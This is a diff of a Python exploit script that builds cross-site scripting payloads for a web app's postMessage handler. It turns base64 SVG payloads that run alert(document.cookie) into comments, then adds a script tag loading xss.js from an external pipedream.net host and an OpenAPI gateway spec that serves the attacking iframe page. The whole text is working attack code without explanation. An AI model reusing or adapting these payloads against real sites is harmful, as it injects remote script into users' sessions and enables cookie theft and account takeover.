@@ -5,8 +5,12 @@ from urllib.parse import quote
 
 base = "http://localhost:3000/"
 
-name = "embed"
-src = "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="
+# name = "embed"
+# src = "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="
+# src = "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoZG9jdW1lbnQuY29va2llKTs8L3NjcmlwdD48L3N2Zz4="
+
+name = "script"
+src="https://eoikvczv5cff25f.m.pipedream.net/xss.js"
 
 jsbin_p = f"<{name} src=\"{src}\">"
 
@@ -28,10 +32,41 @@ html_p='''
           name: 'NAME',
           src: 'SRC'
         }
-      }, 'http://localhost:3000'); // Укажите точный origin
+      }, '*');
     }, 100);
   };
 </script>
 '''.replace('BASE', base).replace('NAME', name).replace('SRC', src)
-
 print(html_p)
+
+openapi_p = '''openapi: 3.0.0
+info:
+  title: Sample API
+  version: 1.0.0
+servers:
+- url: https://d5d04v3t472k3dki3oha.kf69zffa.apigw.yandexcloud.net
+paths:
+  /:
+    get:
+      x-yc-apigateway-integration:
+        type: dummy
+        content:
+          '*': |
+            <iframe id="app" src="BASE"></iframe>
+            <script>
+              document.getElementById('app').onload = function() {
+                setTimeout(() => {
+                  this.contentWindow.postMessage({
+                    type: 'SET_B2B_PARTNER_ICON',
+                    payload: {
+                      name: 'NAME',
+                      src: 'SRC'                    }
+                  }, '*');
+                }, 100);
+              };
+            </script>
+        http_code: 200
+        http_headers:
+          Content-Type: text/html; charset=utf-8'''.replace('BASE', base).replace('NAME', name).replace('SRC', src)
+
+print(openapi_p)
